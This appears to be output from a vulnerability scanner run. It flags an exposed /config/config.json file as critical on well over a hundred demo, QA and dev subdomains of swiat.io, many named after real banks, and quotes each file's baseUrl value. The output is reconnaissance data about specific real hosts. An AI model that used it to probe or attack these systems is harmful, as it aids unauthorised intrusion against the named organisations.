+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.int-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.qa-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.qa-ssf-3.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.qa-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.qanet-ssf.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.deka-chs.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.demo-cbmt.demo1.swiat.io/config/config.json [""baseUrl": "https://deka.demo-cbmt.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.demo-deka-aircraft-finance.demo2.swiat.io/config/config.json [""baseUrl": "https://deka.demo-deka-aircraft-finance.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.demo-deka-erc20.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.demo-deka.demo2.swiat.io/config/config.json [""baseUrl": "https://deka.demo-deka.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.demo-ecb.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.demo-kreissparkasse-koeln.demo2.swiat.io/config/config.json [""baseUrl": "https://deka.demo-kreissparkasse-koeln.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.demo-olea.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.demo-pontes.demo2.swiat.io/config/config.json [""baseUrl": "https://deka.demo-pontes.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.demo-stable-coin.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.qa-2.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://deka.qa-deka.dev3.swiat.io/config/config.json [""baseUrl": "https://deka.qa-deka.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://dev.swiat.io/config/config.json [""baseUrl": "https://dev.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://dz.demo-ui.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext01.qanet-qa3.swiat.io/config/config.json [""baseUrl": "https://ext01.qanet-qa3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext01.qanet-ssf.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext01.qanet.swiat.io/config/config.json [""baseUrl": "https://ext01.qanet.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext02.bughunt.swiat.io/config/config.json [""baseUrl": "https://ext02.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext02.qanet-qa3.swiat.io/config/config.json [""baseUrl": "https://ext02.qanet-qa3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext02.qanet.swiat.io/config/config.json [""baseUrl": "https://ext02.qanet.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext03.bughunt.swiat.io/config/config.json [""baseUrl": "https://ext03.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext03.qanet-qa3.swiat.io/config/config.json [""baseUrl": "https://ext03.qanet-qa3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext03.qanet-ssf.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext04.qanet-ssf.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext04.qanet.swiat.io/config/config.json [""baseUrl": "https://ext04.qanet.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext05.bughunt.swiat.io/config/config.json [""baseUrl": "https://ext05.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext05.qanet-qa3.swiat.io/config/config.json [""baseUrl": "https://ext05.qanet-qa3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext05.qanet-ssf.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext05.qanet.swiat.io/config/config.json [""baseUrl": "https://ext05.qanet.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext06.bughunt.swiat.io/config/config.json [""baseUrl": "https://ext06.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext06.qanet-qa3.swiat.io/config/config.json [""baseUrl": "https://ext06.qanet-qa3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext06.qanet.swiat.io/config/config.json [""baseUrl": "https://ext06.qanet.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext07.bughunt.swiat.io/config/config.json [""baseUrl": "https://ext07.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext07.qanet-qa3.swiat.io/config/config.json [""baseUrl": "https://ext07.qanet-qa3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ext07.qanet.swiat.io/config/config.json [""baseUrl": "https://ext07.qanet.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://firstb.demo-statestreet.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://gft.demo-gft.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://gg.demo-bog-payment.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://green.demo-bank-of-greece.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://green.demo-bog-payment.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://hal.demo-abnamro.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ing.demo-ing-bank.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ing.demo-stable-coin.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://kfw.demo-kfw.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ksk.demo-kreissparkasse-koeln.demo2.swiat.io/config/config.json [""baseUrl": "https://ksk.demo-kreissparkasse-koeln.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://lbbw.deka-chs.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://lbbw.demo-cbmt.demo1.swiat.io/config/config.json [""baseUrl": "https://lbbw.demo-cbmt.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://lbbw.demo-ecb.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://lbbw.demo-lbbw.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://lbbw.demo-sl.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://nbd.demo-national-bank-of-dubai.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ntt.demo-ntt.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://oebfa.demo-delphi-assets.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://oebfa.demo-delphi-assets.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://oebfa.demo-delphi-payments.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://oebfa.demo-delphi-payments.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://oekb-csd.delphi-pontes-pilot.demo1.swiat.io/config/config.json [""baseUrl": "https://oekb-csd.delphi-pontes-pilot.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://oekb-csd.demo-delphi-assets.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://oekb-csd.demo-delphi-assets.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://oekb-csd.demo-delphi-payments.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://oekb-csd.demo-delphi-payments.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://olea.demo-olea.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://orange.demo-bog-payment.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://orange.demo-kinexys.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://orange.dev-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://orange.dev-1.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://orange.dev-connex.dev2.swiat.io/config/config.json [""baseUrl": "https://orange.dev-connex.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://orange.dev-ops-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://orange.int-1.dev1.swiat.io/config/config.json [""baseUrl": "https://orange.int-1.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://orange.int-2.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://orange.qa-1.dev1.swiat.io/config/config.json [""baseUrl": "https://orange.qa-1.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://orange.qa-deka.dev3.swiat.io/config/config.json [""baseUrl": "https://orange.qa-deka.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://pp-router.demo-bog-payment.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://pp-router.demo-kinexys.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://pp-router.dev-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://pp-router.dev-1.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://pp-router.int-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://pp-router.int-2.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://pp-router.qa-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://qanet.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://red.demo-dvp.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://reg-swiat.demo-ewpg-issuance.demo1.swiat.io/config/config.json [""baseUrl": "https://reg-swiat.demo-ewpg-issuance.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://sc.demo-sl.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://scb.demo-scb-dcm.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://scb.demo-scb.demo2.swiat.io/config/config.json [""baseUrl": "https://scb.demo-scb.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://sinan.dev-ops-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://statestr.demo-state-street.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://statestr.demo-statestreet.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat-ccx.bughunt.swiat.io/config/config.json [""baseUrl": "https://swiat-ccx.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat-ccx.qanet-qa3.swiat.io/config/config.json [""baseUrl": "https://swiat-ccx.qanet-qa3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat-registrar.demo-bayernlb.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat-registrar.demo-bayernlb.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat-registrar.demo-niedersachsen.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat-registrar.demo-niedersachsen.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat-rg.demo-dws.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.abn-amro-sandbox.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.abn-amro-sandbox.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.ba-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.dea-1.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.dea-1.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.deka-chs.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.delphi-pontes-pilot.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.delphi-pontes-pilot.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-1.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-1.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-13.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-13.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-3.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-360x.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-6.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-6.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-9.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-9.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-abnamro.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-ads.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-bank-of-greece.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-barclays.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-bayernlb-erc20.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-bayernlb.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-bayernlb.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-bny.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-bny.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-bog-payment.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-buba.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-cbi.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-cbmt.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-cbmt.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-ccx.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-ccx.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-cecabank.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-cecabank.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-deka-aircraft-finance.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-deka-aircraft-finance.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-deka-erc20.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-deka.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-deka.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-delphi-assets.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-delphi-assets.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-delphi-payments.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-delphi-payments.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-dvp.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-dws.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-ecb-repo.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-ecb.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-eib.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-eib.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-evonik.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-ewpg-issuance.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-ewpg-issuance.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-gft.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-ing-bank.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-kfw.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-kinexys.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-kreissparkasse-koeln.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-kreissparkasse-koeln.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-lbbw.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-national-bank-of-dubai.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-niedersachsen.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-niedersachsen.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-ntt.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-olea.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-playground-felix.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-pontes.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-pontes.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-registrar.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-scb-dcm.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-scb.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-scb.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-sl.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-stable-coin.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-state-street.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-statestreet.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://swiat.demo-tt.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
